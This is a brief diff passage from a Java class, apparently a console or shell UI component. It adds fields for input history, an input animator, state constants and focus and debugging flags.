+	private final CommandLineHistory browseHistoryManager_;
+
+	private final ShellInputAnimator inputAnimator_;
+
+	private String initialInput_;
+
+	private static final String GROUP_CONSOLE = "console";
+	private static final String STATE_INPUT = "input";
+
+	private boolean restoreFocus_ = true;
+	private boolean debugging_ = false;
 }
